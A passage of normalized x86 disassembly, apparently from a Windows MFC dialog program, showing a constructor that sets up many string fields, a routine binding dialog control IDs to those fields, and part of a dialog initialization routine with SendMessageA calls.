mov eax [ ebp + 0x270 ]
mov ecx edi
push eax
push 0xf
push esi
call sub_43c1c5
mov eax [ ebp + 0x2a0 ]
mov ecx edi
push eax
push 0x10
push esi
call sub_43c1c5
mov eax [ ebp + 0x2ac ]
mov ecx edi
push eax
push 0x11
push esi
call sub_43c1c5
mov edx [ ebp + 0x158 ]
lea ecx [ ebp + 0x158 ]
push 0x1
push 0x1
inc esi
call [ edx + 0x14 ]
mov eax [ ebp + 0x220 ]
test eax eax
je r-xdata
mov edi [ SendMessageA@IAT ]
pop ebx
sub_41c380
push 0xffffffff
push sub_462421
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push ebx
push ebp
push esi
push edi
mov esi ecx
push eax
push 0x87
mov [ esp + 0x18 ] esi
call sub_43ddd5
lea edi [ esi + 0x5c ]
mov [ esp + 0x1c ] 0x0
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0x98 ]
mov [ esp + 0x1c ] 0x1
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0xd4 ]
mov [ esp + 0x1c ] 0x2
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0x110 ]
mov [ esp + 0x1c ] 0x3
mov ecx edi
call sub_43e388
mov [ edi ] r--data
mov edx [ rw-data ]
lea ecx [ esi + 0x14c ]
mov [ ecx ] edx
mov eax [ rw-data ]
lea edi [ esi + 0x150 ]
mov [ edi ] eax
mov edx [ rw-data ]
lea ebp [ esi + 0x154 ]
mov [ ebp ] edx
mov eax [ rw-data ]
lea ebx [ esi + 0x158 ]
mov [ ebx ] eax
mov edx [ rw-data ]
mov [ esi + 0x168 ] edx
mov eax [ rw-data ]
mov [ esi + 0x16c ] eax
mov edx [ rw-data ]
mov [ esi + 0x170 ] edx
mov eax [ rw-data ]
mov [ esi + 0x174 ] eax
mov edx [ rw-data ]
mov [ esi + 0x178 ] edx
mov eax [ rw-data ]
mov [ esi + 0x17c ] eax
mov edx [ rw-data ]
mov [ esi + 0x180 ] edx
mov eax [ rw-data ]
mov [ esi + 0x184 ] eax
mov edx [ rw-data ]
mov [ esi + 0x188 ] edx
mov eax [ rw-data ]
mov [ esi + 0x18c ] eax
mov edx [ rw-data ]
mov [ esi + 0x190 ] edx
mov eax [ rw-data ]
mov [ esi + 0x194 ] eax
mov edx [ rw-data ]
mov [ esi + 0x198 ] edx
mov eax [ rw-data ]
mov [ esi + 0x19c ] eax
mov edx [ rw-data ]
mov [ esi + 0x1a0 ] edx
mov eax [ rw-data ]
mov [ esi + 0x1a4 ] eax
mov edx [ rw-data ]
mov [ esi + 0x1a8 ] edx
mov eax [ rw-data ]
mov [ esi + 0x1ac ] eax
mov edx [ rw-data ]
mov [ esi + 0x1b0 ] edx
mov eax [ rw-data ]
mov [ esi + 0x1b4 ] eax
mov edx [ rw-data ]
mov [ esi + 0x1b8 ] edx
mov eax [ rw-data ]
mov [ esi + 0x1bc ] eax
mov edx [ rw-data ]
mov [ esi + 0x1c0 ] edx
mov eax [ rw-data ]
mov [ esi + 0x1c4 ] eax
mov edx [ rw-data ]
mov [ esi + 0x1c8 ] edx
mov eax [ rw-data ]
mov [ esi + 0x1cc ] eax
mov edx [ rw-data ]
mov [ esi + 0x1d0 ] edx
mov eax [ rw-data ]
mov [ esi + 0x1d4 ] eax
mov edx [ rw-data ]
mov [ esi + 0x1d8 ] edx
mov eax [ rw-data ]
mov [ esi + 0x1dc ] eax
mov edx [ rw-data ]
mov [ esi + 0x1e0 ] edx
mov eax [ rw-data ]
mov [ esi + 0x1e4 ] eax
mov edx [ rw-data ]
mov [ esi + 0x1e8 ] edx
mov eax [ rw-data ]
mov [ esi + 0x1ec ] eax
mov edx [ rw-data ]
mov [ esi + 0x1f0 ] edx
mov eax [ rw-data ]
mov [ esi + 0x1f4 ] eax
mov edx [ rw-data ]
mov [ esi + 0x1f8 ] edx
mov eax [ rw-data ]
mov [ esi + 0x1fc ] eax
mov edx [ rw-data ]
mov [ esi + 0x200 ] edx
mov eax [ rw-data ]
mov [ esi + 0x204 ] eax
mov edx [ rw-data ]
mov [ esi + 0x208 ] edx
mov eax [ rw-data ]
mov [ esi + 0x20c ] eax
mov edx [ rw-data ]
mov [ esi + 0x210 ] edx
mov eax [ rw-data ]
mov [ esi + 0x214 ] eax
mov edx [ rw-data ]
mov [ esi + 0x218 ] edx
mov eax [ rw-data ]
mov [ esi + 0x21c ] eax
mov edx [ rw-data ]
mov [ esi + 0x220 ] edx
mov eax [ rw-data ]
mov [ esi + 0x224 ] eax
mov edx [ rw-data ]
mov [ esi + 0x228 ] edx
mov eax [ rw-data ]
mov [ esi + 0x22c ] eax
mov edx [ rw-data ]
mov [ esi + 0x230 ] edx
mov eax [ rw-data ]
mov [ esi + 0x234 ] eax
mov edx [ rw-data ]
mov [ esi + 0x238 ] edx
mov eax [ rw-data ]
mov [ esi + 0x23c ] eax
mov edx [ rw-data ]
mov [ esi + 0x240 ] edx
mov eax [ rw-data ]
mov [ esi + 0x244 ] eax
mov edx [ rw-data ]
mov [ esi + 0x248 ] edx
mov eax [ rw-data ]
mov [ esi + 0x24c ] eax
push rw-data
mov [ esp + 0x20 ] 0x42
mov [ esi ] r--data
call sub_4422d1
push rw-data
mov ecx edi
call sub_4422d1
push rw-data
mov ecx ebp
call sub_4422d1
push rw-data
mov ecx ebx
call sub_4422d1
xor eax eax
push rw-data
mov [ esi + 0x15c ] eax
mov [ esi + 0x160 ] eax
mov [ esi + 0x164 ] eax
lea ecx [ esi + 0x168 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x16c ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x170 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x174 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x178 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x17c ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x180 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x184 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x188 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x18c ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x190 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x194 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x198 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x19c ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1a0 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1a4 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1a8 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1ac ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1b0 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1b4 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1b8 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1bc ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1c0 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1c4 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1c8 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1cc ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1d0 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1d4 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1d8 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1dc ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1e0 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1e4 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1e8 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1ec ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1f0 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1f4 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1f8 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1fc ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x200 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x204 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x208 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x20c ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x210 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x214 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x218 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x21c ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x220 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x224 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x228 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x22c ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x230 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x234 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x238 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x23c ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x240 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x244 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x248 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x24c ]
call sub_4422d1
mov ecx [ esp + 0x14 ]
mov [ esi + 0x250 ] 0x1
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_41cb10
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
lea eax [ esi + 0x5c ]
push eax
push 0x3fb
push edi
call sub_449556
lea ecx [ esi + 0x98 ]
push ecx
push 0x3f7
push edi
call sub_449556
lea edx [ esi + 0xd4 ]
push edx
push 0x3f5
push edi
call sub_449556
lea eax [ esi + 0x110 ]
push eax
push 0x3f6
push edi
call sub_449556
lea ecx [ esi + 0x14c ]
push ecx
push 0x3f6
push edi
call sub_449495
lea edx [ esi + 0x150 ]
push edx
push 0x3f5
push edi
call sub_449495
lea eax [ esi + 0x154 ]
push eax
push 0x3fd
push edi
call sub_449495
lea ecx [ esi + 0x158 ]
push ecx
push 0x3f7
push edi
call sub_449495
lea edx [ esi + 0x15c ]
push edx
push 0x3f8
push edi
call sub_4257ba
lea eax [ esi + 0x160 ]
push eax
push 0x3f9
push edi
call sub_4257ba
lea ecx [ esi + 0x164 ]
push ecx
push 0x3fa
push edi
call sub_4257ba
lea edx [ esi + 0x168 ]
push edx
push 0x3ed
push edi
call sub_4493f1
lea eax [ esi + 0x16c ]
push eax
push 0x408
push edi
call sub_4493f1
lea ecx [ esi + 0x170 ]
push ecx
push 0x409
push edi
call sub_4493f1
lea edx [ esi + 0x174 ]
push edx
push 0x40a
push edi
call sub_4493f1
lea eax [ esi + 0x178 ]
push eax
push 0x40b
push edi
call sub_4493f1
lea ecx [ esi + 0x17c ]
push ecx
push 0x40c
push edi
call sub_4493f1
lea edx [ esi + 0x180 ]
push edx
push 0x40d
push edi
call sub_4493f1
lea eax [ esi + 0x184 ]
push eax
push 0x3f4
push edi
call sub_4493f1
lea ecx [ esi + 0x188 ]
push ecx
push 0x3f2
push edi
call sub_4493f1
lea edx [ esi + 0x18c ]
push edx
push 0x3ea
push edi
call sub_4493f1
lea eax [ esi + 0x190 ]
push eax
push 0x3f3
push edi
call sub_4493f1
lea ecx [ esi + 0x194 ]
push ecx
push 0x402
push edi
call sub_4493f1
lea edx [ esi + 0x198 ]
push edx
push 0x403
push edi
call sub_4493f1
lea eax [ esi + 0x19c ]
push eax
push 0x404
push edi
call sub_4493f1
lea ecx [ esi + 0x1a0 ]
push ecx
push 0x3eb
push edi
call sub_4493f1
lea edx [ esi + 0x1a4 ]
push edx
push 0x3fe
push edi
call sub_4493f1
lea eax [ esi + 0x1a8 ]
push eax
push 0x3ec
push edi
call sub_4493f1
lea ecx [ esi + 0x1ac ]
push ecx
push 0x421
push edi
call sub_4493f1
lea edx [ esi + 0x1b0 ]
push edx
push 0x422
push edi
call sub_4493f1
lea eax [ esi + 0x1b4 ]
push eax
push 0x423
push edi
call sub_4493f1
lea ecx [ esi + 0x1b8 ]
push ecx
push 0x424
push edi
call sub_4493f1
lea edx [ esi + 0x1bc ]
push edx
push 0x425
push edi
call sub_4493f1
lea eax [ esi + 0x1c0 ]
push eax
push 0x426
push edi
call sub_4493f1
lea ecx [ esi + 0x1c4 ]
push ecx
push 0x41b
push edi
call sub_4493f1
lea edx [ esi + 0x1c8 ]
push edx
push 0x41c
push edi
call sub_4493f1
lea eax [ esi + 0x1cc ]
push eax
push 0x41d
push edi
call sub_4493f1
lea ecx [ esi + 0x1d0 ]
push ecx
push 0x41e
push edi
call sub_4493f1
lea edx [ esi + 0x1d4 ]
push edx
push 0x41f
push edi
call sub_4493f1
lea eax [ esi + 0x1d8 ]
push eax
push 0x420
push edi
call sub_4493f1
lea ecx [ esi + 0x1dc ]
push ecx
push 0x40e
push edi
call sub_4493f1
lea edx [ esi + 0x1e0 ]
push edx
push 0x40f
push edi
call sub_4493f1
lea eax [ esi + 0x1e4 ]
push eax
push 0x410
push edi
call sub_4493f1
lea ecx [ esi + 0x1e8 ]
push ecx
push 0x3f1
push edi
call sub_4493f1
lea edx [ esi + 0x1ec ]
push edx
push 0x405
push edi
call sub_4493f1
lea eax [ esi + 0x1f0 ]
push eax
push 0x407
push edi
call sub_4493f1
lea ecx [ esi + 0x1f4 ]
push ecx
push 0x406
push edi
call sub_4493f1
lea edx [ esi + 0x1f8 ]
push edx
push 0x3f0
push edi
call sub_4493f1
lea eax [ esi + 0x1fc ]
push eax
push 0x3ff
push edi
call sub_4493f1
lea ecx [ esi + 0x200 ]
push ecx
push 0x400
push edi
call sub_4493f1
lea edx [ esi + 0x204 ]
push edx
push 0x401
push edi
call sub_4493f1
lea eax [ esi + 0x208 ]
push eax
push 0x427
push edi
call sub_4493f1
lea ecx [ esi + 0x20c ]
push ecx
push 0x428
push edi
call sub_4493f1
lea edx [ esi + 0x210 ]
push edx
push 0x429
push edi
call sub_4493f1
lea eax [ esi + 0x214 ]
push eax
push 0x42a
push edi
call sub_4493f1
lea ecx [ esi + 0x218 ]
push ecx
push 0x42b
push edi
call sub_4493f1
lea edx [ esi + 0x21c ]
push edx
push 0x42c
push edi
call sub_4493f1
lea eax [ esi + 0x220 ]
push eax
push 0x411
push edi
call sub_4493f1
lea ecx [ esi + 0x224 ]
push ecx
push 0x41a
push edi
call sub_4493f1
lea edx [ esi + 0x228 ]
push edx
push 0x412
push edi
call sub_4493f1
lea eax [ esi + 0x22c ]
push eax
push 0x413
push edi
call sub_4493f1
lea ecx [ esi + 0x230 ]
push ecx
push 0x414
push edi
call sub_4493f1
lea edx [ esi + 0x234 ]
push edx
push 0x415
push edi
call sub_4493f1
lea eax [ esi + 0x238 ]
push eax
push 0x416
push edi
call sub_4493f1
lea ecx [ esi + 0x23c ]
push ecx
push 0x417
push edi
call sub_4493f1
lea edx [ esi + 0x240 ]
push edx
push 0x418
push edi
call sub_4493f1
lea eax [ esi + 0x244 ]
push eax
push 0x419
push edi
call sub_4493f1
lea ecx [ esi + 0x248 ]
push ecx
push 0x3fb
push edi
call sub_4493f1
add esi 0x24c
push esi
push 0x3fc
push edi
call sub_4493f1
pop edi
pop esi
retn 0x4
sub_41d010
push 0xffffffff
push sub_4629f1
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x338
push ebx
push esi
push edi
mov esi ecx
call sub_43e113
xor ebx ebx
lea ecx [ esp + 0x228 ]
push ebx
call sub_40b290
mov eax [ rw-data ]
mov [ esp + 0x34c ] ebx
mov [ esp + 0xc ] eax
push rw-data
lea ecx [ esp + 0x10 ]
mov [ esp + 0x350 ] 0x1
call sub_4422d1
mov ecx [ esp + 0xc ]
push ebx
push ecx
push 0xffffffff
lea ecx [ esp + 0x234 ]
call sub_42182c
test eax eax
jne r-xdata
cmp [ esp + 0x2f0 ] ebx
jne r-xdata
push ebx
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
lea ecx [ esp + 0x228 ]
call sub_421900
mov eax [ esi + 0x248 ]
lea edi [ esi + 0x248 ]
cmp [ eax - 0x8 ] ebx
je r-xdata
mov edi [ SendMessageA@IAT ]
push ebx
mov ecx esi
call sub_440b18
lea ecx [ esp + 0xc ]
mov [ esp + 0x34c ] bl
call sub_442148
lea ecx [ esp + 0x340 ]
mov [ esp + 0x34c ] 0x86
call sub_442148
lea ecx [ esp + 0x33c ]
mov [ esp + 0x34c ] 0x85
call sub_442148
lea ecx [ esp + 0x338 ]
mov [ esp + 0x34c ] 0x84
call sub_442148
lea ecx [ esp + 0x228 ]
mov [ esp + 0x34c ] 0xffffffff
call sub_421723
mov eax 0x1
push ebx
lea ecx [ esi + 0x5c ]
mov [ esi + 0x250 ] ebx
call sub_441841
push ebx
lea ecx [ esp + 0x14 ]
call sub_41e710
mov ecx [ edi ]
lea edx [ esp + 0xc ]
push ecx
push rw-data
push edx
mov [ esp + 0x358 ] 0x2
call sub_43b5cc
mov eax [ esp + 0x18 ]
add esp 0xc
lea ecx [ esp + 0x10 ]
push ebx
push eax
push 0xffffffff
call sub_42182c
test eax eax
jne r-xdata
mov edx [ esp + 0x33c ]
mov eax [ esi + 0xf0 ]
push edx
push ebx
push 0x143
push eax
call edi
mov edx [ esp + 0x228 ]
push 0x1
push 0x1
lea ecx [ esp + 0x230 ]
call [ edx + 0x14 ]
cmp [ esp + 0x2f0 ] ebx
je r-xdata
lea ecx [ esp + 0x128 ]
push ecx
lea ecx [ esi + 0x14c ]
call sub_442281
lea edx [ esp + 0x158 ]
lea ecx [ esi + 0x150 ]
push edx
call sub_442281
lea eax [ esp + 0x12c ]
lea ecx [ esi + 0x154 ]
push eax
call sub_442281
lea ecx [ esp + 0x164 ]
push ecx
lea ecx [ esi + 0x158 ]
call sub_442281
mov edx [ esp + 0x154 ]
mov eax [ esp + 0x148 ]
mov ecx [ esp + 0x14c ]
mov [ esi + 0x15c ] edx
mov [ esi + 0x160 ] eax
lea edx [ esp + 0x150 ]
mov [ esi + 0x164 ] ecx
push edx
lea ecx [ esi + 0x168 ]
call sub_442281
lea eax [ esp + 0x190 ]
lea ecx [ esi + 0x16c ]
push eax
call sub_442281
lea ecx [ esp + 0x194 ]
push ecx
lea ecx [ esi + 0x170 ]
call sub_442281
lea edx [ esp + 0x198 ]
lea ecx [ esi + 0x174 ]
push edx
call sub_442281
lea eax [ esp + 0x19c ]
lea ecx [ esi + 0x178 ]
push eax
call sub_442281
lea ecx [ esp + 0x1a0 ]
push ecx
lea ecx [ esi + 0x17c ]
call sub_442281
lea edx [ esp + 0x198 ]
lea ecx [ esi + 0x180 ]
push edx
call sub_442281
lea eax [ esp + 0x168 ]
lea ecx [ esi + 0x184 ]
push eax
call sub_442281
lea ecx [ esp + 0x13c ]
push ecx
lea ecx [ esi + 0x188 ]
call sub_442281
lea edx [ esp + 0x130 ]
lea ecx [ esi + 0x18c ]
push edx
call sub_442281
lea eax [ esp + 0x15c ]
lea ecx [ esi + 0x190 ]
push eax
call sub_442281
lea ecx [ esp + 0x178 ]
push ecx
lea ecx [ esi + 0x194 ]
call sub_442281
lea edx [ esp + 0x17c ]
lea ecx [ esi + 0x198 ]
push edx
call sub_442281
lea eax [ esp + 0x180 ]
lea ecx [ esi + 0x19c ]
push eax
call sub_442281
lea ecx [ esp + 0x144 ]
push ecx
lea ecx [ esi + 0x1a0 ]
call sub_442281
lea edx [ esp + 0x138 ]
lea ecx [ esi + 0x1a4 ]
push edx
call sub_442281
lea eax [ esp + 0x140 ]
lea ecx [ esi + 0x1a8 ]
push eax
call sub_442281
lea ecx [ esp + 0x1f8 ]
push ecx
lea ecx [ esi + 0x1ac ]
call sub_442281
lea edx [ esp + 0x1fc ]
lea ecx [ esi + 0x1b0 ]
push edx
call sub_442281
lea eax [ esp + 0x200 ]
lea ecx [ esi + 0x1b4 ]
push eax
call sub_442281
lea ecx [ esp + 0x204 ]
push ecx
lea ecx [ esi + 0x1b8 ]
call sub_442281
lea edx [ esp + 0x208 ]
lea ecx [ esi + 0x1bc ]
push edx
call sub_442281
lea eax [ esp + 0x20c ]
lea ecx [ esi + 0x1c0 ]
push eax
call sub_442281
lea ecx [ esp + 0x1e0 ]
push ecx
lea ecx [ esi + 0x1c4 ]
call sub_442281
lea edx [ esp + 0x1e4 ]
lea ecx [ esi + 0x1c8 ]
push edx
call sub_442281
lea eax [ esp + 0x1e8 ]
lea ecx [ esi + 0x1cc ]
push eax
call sub_442281
lea ecx [ esp + 0x1ec ]
push ecx
lea ecx [ esi + 0x1d0 ]
call sub_442281
lea edx [ esp + 0x1f0 ]
lea ecx [ esi + 0x1d4 ]
push edx
call sub_442281
lea eax [ esp + 0x1f4 ]
lea ecx [ esi + 0x1d8 ]
push eax
call sub_442281
lea ecx [ esp + 0x1a8 ]
push ecx
lea ecx [ esi + 0x1dc ]
call sub_442281
lea edx [ esp + 0x1ac ]
lea ecx [ esi + 0x1e0 ]
push edx
call sub_442281
lea eax [ esp + 0x1b0 ]
lea ecx [ esi + 0x1e4 ]
push eax
call sub_442281
lea ecx [ esp + 0x134 ]
push ecx
lea ecx [ esi + 0x1e8 ]
call sub_442281
lea edx [ esp + 0x184 ]
lea ecx [ esi + 0x1ec ]
push edx
call sub_442281
lea eax [ esp + 0x188 ]
lea ecx [ esi + 0x1f0 ]
push eax
call sub_442281
lea ecx [ esp + 0x18c ]
push ecx
lea ecx [ esi + 0x1f4 ]
call sub_442281
lea edx [ esp + 0x160 ]
lea ecx [ esi + 0x1f8 ]
push edx
call sub_442281
lea eax [ esp + 0x16c ]
lea ecx [ esi + 0x1fc ]
push eax
call sub_442281
lea ecx [ esp + 0x170 ]
push ecx
lea ecx [ esi + 0x200 ]
call sub_442281
lea edx [ esp + 0x174 ]
lea ecx [ esi + 0x204 ]
push edx
call sub_442281
lea eax [ esp + 0x210 ]
lea ecx [ esi + 0x208 ]
push eax
call sub_442281
lea ecx [ esp + 0x214 ]
push ecx
lea ecx [ esi + 0x20c ]
call sub_442281
lea edx [ esp + 0x218 ]
lea ecx [ esi + 0x210 ]
push edx
call sub_442281
lea eax [ esp + 0x21c ]
lea ecx [ esi + 0x214 ]
push eax
call sub_442281
lea ecx [ esp + 0x220 ]
push ecx
lea ecx [ esi + 0x218 ]
call sub_442281
lea edx [ esp + 0x224 ]
lea ecx [ esi + 0x21c ]
push edx
call sub_442281
lea eax [ esp + 0x1b4 ]
lea ecx [ esi + 0x220 ]
push eax
call sub_442281
lea ecx [ esp + 0x1d8 ]
push ecx
lea ecx [ esi + 0x224 ]
call sub_442281
lea edx [ esp + 0x1b8 ]
lea ecx [ esi + 0x228 ]
push edx
call sub_442281
lea eax [ esp + 0x1bc ]
lea ecx [ esi + 0x22c ]
push eax
call sub_442281
lea ecx [ esp + 0x1c0 ]
push ecx
lea ecx [ esi + 0x230 ]
call sub_442281
lea edx [ esp + 0x1c4 ]
lea ecx [ esi + 0x234 ]
push edx
call sub_442281
lea eax [ esp + 0x1c8 ]
lea ecx [ esi + 0x238 ]
push eax
call sub_442281
lea ecx [ esp + 0x1cc ]
push ecx
lea ecx [ esi + 0x23c ]
call sub_442281
lea edx [ esp + 0x1d0 ]
lea ecx [ esi + 0x240 ]
push edx
call sub_442281
lea eax [ esp + 0x1d4 ]
push eax
lea ecx [ esi + 0x244 ]
call sub_442281
lea ecx [ esp + 0x120 ]
push ecx
mov ecx edi
call sub_442281
lea edx [ esp + 0x124 ]
lea ecx [ esi + 0x24c ]
push edx
call sub_442281
lea ecx [ esp + 0x10 ]
call sub_421900
lea ecx [ esp + 0x224 ]
mov [ esp + 0x34c ] 0x83
call sub_442148
mov [ esp + 0x34c ] 0x82
lea ecx [ esp + 0x220 ]
call sub_442148
lea ecx [ esp + 0x21c ]
mov [ esp + 0x34c ] 0x81
call sub_442148
lea ecx [ esp + 0x218 ]
mov [ esp + 0x34c ] 0x80
call sub_442148
lea ecx [ esp + 0x214 ]
mov [ esp + 0x34c ] 0x7f
call sub_442148
lea ecx [ esp + 0x210 ]
mov [ esp + 0x34c ] 0x7e
call sub_442148
lea ecx [ esp + 0x20c ]
mov [ esp + 0x34c ] 0x7d
call sub_442148
lea ecx [ esp + 0x208 ]
mov [ esp + 0x34c ] 0x7c
call sub_442148
lea ecx [ esp + 0x204 ]
mov [ esp + 0x34c ] 0x7b
call sub_442148
lea ecx [ esp + 0x200 ]
mov [ esp + 0x34c ] 0x7a
call sub_442148
lea ecx [ esp + 0x1fc ]
mov [ esp + 0x34c ] 0x79
call sub_442148
lea ecx [ esp + 0x1f8 ]
mov [ esp + 0x34c ] 0x78
call sub_442148
lea ecx [ esp + 0x1f4 ]
mov [ esp + 0x34c ] 0x77
call sub_442148
lea ecx [ esp + 0x1f0 ]
mov [ esp + 0x34c ] 0x76
call sub_442148
lea ecx [ esp + 0x1ec ]
mov [ esp + 0x34c ] 0x75
call sub_442148
lea ecx [ esp + 0x1e8 ]
mov [ esp + 0x34c ] 0x74
call sub_442148
lea ecx [ esp + 0x1e4 ]
mov [ esp + 0x34c ] 0x73
call sub_442148
lea ecx [ esp + 0x1e0 ]
mov [ esp + 0x34c ] 0x72
call sub_442148
lea ecx [ esp + 0x1dc ]
mov [ esp + 0x34c ] 0x71
call sub_442148
lea ecx [ esp + 0x1d8 ]
mov [ esp + 0x34c ] 0x70
call sub_442148
lea ecx [ esp + 0x1d4 ]
mov [ esp + 0x34c ] 0x6f
call sub_442148
lea ecx [ esp + 0x1d0 ]
mov [ esp + 0x34c ] 0x6e
call sub_442148
lea ecx [ esp + 0x1cc ]
mov [ esp + 0x34c ] 0x6d
call sub_442148
lea ecx [ esp + 0x1c8 ]
mov [ esp + 0x34c ] 0x6c
call sub_442148
lea ecx [ esp + 0x1c4 ]
mov [ esp + 0x34c ] 0x6b
call sub_442148
lea ecx [ esp + 0x1c0 ]
mov [ esp + 0x34c ] 0x6a
call sub_442148
lea ecx [ esp + 0x1bc ]
mov [ esp + 0x34c ] 0x69
call sub_442148
lea ecx [ esp + 0x1b8 ]
mov [ esp + 0x34c ] 0x68
call sub_442148
mov [ esp + 0x34c ] 0x67
lea ecx [ esp + 0x1b4 ]
call sub_442148
lea ecx [ esp + 0x1b0 ]
mov [ esp + 0x34c ] 0x66
call sub_442148
lea ecx [ esp + 0x1ac ]
mov [ esp + 0x34c ] 0x65
call sub_442148
lea ecx [ esp + 0x1a8 ]
mov [ esp + 0x34c ] 0x64
call sub_442148
lea ecx [ esp + 0x1a4 ]
mov [ esp + 0x34c ] 0x63
call sub_442148
lea ecx [ esp + 0x1a0 ]
mov [ esp + 0x34c ] 0x62
call sub_442148
lea ecx [ esp + 0x19c ]
mov [ esp + 0x34c ] 0x61
call sub_442148
lea ecx [ esp + 0x198 ]
mov [ esp + 0x34c ] 0x60
call sub_442148
lea ecx [ esp + 0x194 ]
mov [ esp + 0x34c ] 0x5f
call sub_442148
lea ecx [ esp + 0x190 ]
mov [ esp + 0x34c ] 0x5e
call sub_442148
lea ecx [ esp + 0x18c ]
mov [ esp + 0x34c ] 0x5d
call sub_442148
lea ecx [ esp + 0x188 ]
mov [ esp + 0x34c ] 0x5c
call sub_442148
lea ecx [ esp + 0x184 ]
mov [ esp + 0x34c ] 0x5b
call sub_442148
lea ecx [ esp + 0x180 ]
mov [ esp + 0x34c ] 0x5a
call sub_442148
lea ecx [ esp + 0x17c ]
mov [ esp + 0x34c ] 0x59
call sub_442148
lea ecx [ esp + 0x178 ]
mov [ esp + 0x34c ] 0x58
call sub_442148
lea ecx [ esp + 0x174 ]
mov [ esp + 0x34c ] 0x57
call sub_442148
lea ecx [ esp + 0x170 ]
mov [ esp + 0x34c ] 0x56
call sub_442148
lea ecx [ esp + 0x16c ]
mov [ esp + 0x34c ] 0x55
call sub_442148
lea ecx [ esp + 0x168 ]
mov [ esp + 0x34c ] 0x54
call sub_442148
lea ecx [ esp + 0x164 ]
mov [ esp + 0x34c ] 0x53
call sub_442148
lea ecx [ esp + 0x160 ]
mov [ esp + 0x34c ] 0x52
call sub_442148
lea ecx [ esp + 0x15c ]
mov [ esp + 0x34c ] 0x51
call sub_442148
lea ecx [ esp + 0x158 ]
mov [ esp + 0x34c ] 0x50
call sub_442148
lea ecx [ esp + 0x150 ]
mov [ esp + 0x34c ] 0x4f
call sub_442148
lea ecx [ esp + 0x144 ]
mov [ esp + 0x34c ] 0x4e
call sub_442148
lea ecx [ esp + 0x140 ]
mov [ esp + 0x34c ] 0x4d
call sub_442148
mov [ esp + 0x34c ] 0x4c
lea ecx [ esp + 0x13c ]
call sub_442148
lea ecx [ esp + 0x138 ]
mov [ esp + 0x34c ] 0x4b
call sub_442148
lea ecx [ esp + 0x134 ]
mov [ esp + 0x34c ] 0x4a
call sub_442148
lea ecx [ esp + 0x130 ]
mov [ esp + 0x34c ] 0x49
call sub_442148
lea ecx [ esp + 0x12c ]
mov [ esp + 0x34c ] 0x48
call sub_442148
lea ecx [ esp + 0x128 ]
mov [ esp + 0x34c ] 0x47
call sub_442148
lea ecx [ esp + 0x124 ]
mov [ esp + 0x34c ] 0x46
call sub_442148
lea ecx [ esp + 0x120 ]
mov [ esp + 0x34c ] 0x45
call sub_442148
lea ecx [ esp + 0x10 ]
mov [ esp + 0x34c ] 0x1
call sub_421723
push ebx
push ebx
push rw-data
call sub_4496b7
lea ecx [ esp + 0x224 ]
mov [ esp + 0x34c ] 0x41
call sub_442148
lea ecx [ esp + 0x220 ]
